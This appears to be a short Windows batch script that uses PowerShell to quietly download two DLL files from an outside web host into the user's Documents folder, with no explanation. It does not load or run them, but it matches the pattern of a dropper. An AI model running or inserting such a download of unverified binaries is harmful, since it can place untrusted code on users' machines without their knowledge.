@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://gaboxtv.com/slinky.dll' -OutFile '%USERPROFILE%\Documents\slinky.dll'"
powershell -Command "Invoke-WebRequest -Uri 'https://gaboxtv.com/slinky_library.dll' -OutFile '%USERPROFILE%\Documents\slinky_library.dll'"
exit
